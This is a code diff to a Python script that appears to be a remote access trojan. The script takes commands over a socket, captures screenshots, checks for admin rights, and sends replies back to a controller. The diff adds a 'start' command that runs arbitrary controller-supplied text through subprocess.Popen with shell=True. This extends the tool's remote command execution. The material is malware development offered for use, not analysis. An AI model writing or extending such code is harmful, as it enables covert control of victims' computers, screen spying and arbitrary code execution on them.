@@ -32,6 +32,7 @@ OPTIONS:
 #########################################################################################
 '''
 
+
 def reliable_send(_s, _data):
     if type(_data) is bytes:
         _data = _data.decode('UTF-8')
@@ -57,6 +58,7 @@ def is_admin():
         return False
     else:
         return True
+
 
 def screenshot():
     with mss() as ss:
@@ -123,6 +125,15 @@ def shell(_s):
                 os.remove('monitor-1.png')
             except:
                 reliable_send(_s, '[!] Failed to take the screenshot!!')
+        elif cmd[:5] == "start":
+            try:
+                if len(cmd[6:]) < 1:
+                    reliable_send(_s, '[!] Please specify an app to start!')
+                    break
+                subprocess.Popen(cmd[6:], shell=True)
+                reliable_send(_s, '[+] Started!!')
+            except:
+                reliable_send(_s, '[!] Fail to start!')
         elif cmd[:7] == 'isadmin':
             try:
                 if is_admin():
